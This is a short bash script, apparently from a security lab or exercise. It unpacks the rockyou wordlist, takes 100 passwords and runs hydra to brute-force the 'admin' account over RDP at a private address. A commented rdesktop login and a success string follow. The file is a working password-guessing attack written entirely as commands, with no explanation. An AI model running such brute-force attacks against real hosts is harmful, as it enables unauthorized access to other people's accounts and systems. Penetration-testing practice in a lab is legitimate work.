#/bin/bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
head -n 100 /usr/share/wordlists/rockyou.txt > /usr/share/wordlists/rockyou_min.txt
hydra -l admin -P /usr/share/wordlists/rockyou_min.txt -v -V -f rdp://192.168.100.100
# rdesktop 192.168.100.100 -u admin -p password

# success = "1 valid password found"
